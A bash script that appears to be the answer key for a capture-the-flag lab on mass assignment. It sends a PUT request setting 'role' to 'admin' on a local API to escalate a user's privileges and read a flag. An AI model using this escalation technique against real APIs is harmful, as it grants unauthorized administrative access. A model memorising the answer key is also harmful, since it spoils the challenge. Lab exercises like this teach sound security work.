#!/bin/bash
##
# Solution for Mass Assignment Challenge
# Demonstrates privilege escalation via mass assignment
##

echo "=== Mass Assignment Exploitation Demo ==="
echo ""

API_KEY="alice_api_key_12345"
BASE_URL="http://localhost:4002"

# Step 1: Check current profile
echo "[*] Step 1: Check current user profile..."
echo "GET $BASE_URL/api/profile"
curl -s -H "API-Key: $API_KEY" "$BASE_URL/api/profile" | jq .
echo ""

# Step 2: Try to access admin endpoint (should fail)
echo "[*] Step 2: Try to access admin endpoint (should be forbidden)..."
echo "GET $BASE_URL/api/admin/flag"
curl -s -H "API-Key: $API_KEY" "$BASE_URL/api/admin/flag" | jq .
echo ""

# Step 3: Exploit mass assignment to escalate privileges
echo "[*] Step 3: EXPLOIT - Escalate privileges by setting role=admin..."
echo "PUT $BASE_URL/api/profile with {\"role\":\"admin\"}"
curl -s -X PUT "$BASE_URL/api/profile" \
  -H "API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' | jq .
echo ""

# Step 4: Verify role change
echo "[*] Step 4: Verify role was changed to admin..."
echo "GET $BASE_URL/api/profile"
PROFILE=$(curl -s -H "API-Key: $API_KEY" "$BASE_URL/api/profile")
echo "$PROFILE" | jq .
ROLE=$(echo "$PROFILE" | jq -r '.role')
echo ""
echo "Current role: $ROLE"
echo ""

# Step 5: Access admin endpoint with new privileges
echo "[*] Step 5: Access admin endpoint with elevated privileges..."
echo "GET $BASE_URL/api/admin/flag"
FLAG_RESPONSE=$(curl -s -H "API-Key: $API_KEY" "$BASE_URL/api/admin/flag")
echo "$FLAG_RESPONSE" | jq .
echo ""

# Step 6: Extract and display flag
FLAG=$(echo "$FLAG_RESPONSE" | jq -r '.flag')
echo "ðŸš© FLAG FOUND: $FLAG"
